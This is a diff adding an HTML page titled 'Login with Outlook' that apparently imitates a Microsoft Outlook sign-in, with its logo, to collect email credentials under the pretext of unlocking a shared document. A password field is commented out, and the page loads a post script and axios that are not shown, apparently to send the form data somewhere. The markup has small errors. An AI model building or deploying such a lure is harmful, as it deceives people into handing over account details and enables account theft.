@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <script scr="/Js/script.js"></script>
+    <title>Login with Outlook</title>
+    <meta ="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" type="text/css" href="/css/outlook.css" />
+  </head>
+  <body>
+    <div align="center" style="margin-top: 100px">
+      <img src="/imgs/outlook.png" alt="Logo" />
+      <h2>Login with Outlook</h2>
+      <p>
+        To read the document, please enter your valid email credentials that
+        this file will be sent to.
+      </p>
+      <form class="form">
+        <label for="emailDOM">Email Address:</label>
+        <input
+          style="padding: 0 10px"
+          type="text"
+          id="emailDOM"
+          name="email"
+          required
+        />
+        <br />
+        <!-- <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br><br> -->
+
+        <button
+          type="submit"
+          style="
+            width: 300px;
+            padding: 10px 20px;
+            margin-top: 10px;
+            border-radius: 7px;
+            cursor: pointer;
+          "
+        >
+          submit email
+        </button>
+      </form>
+    </div>
+  </body>
+  <script src="./Js/post-script.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</html>
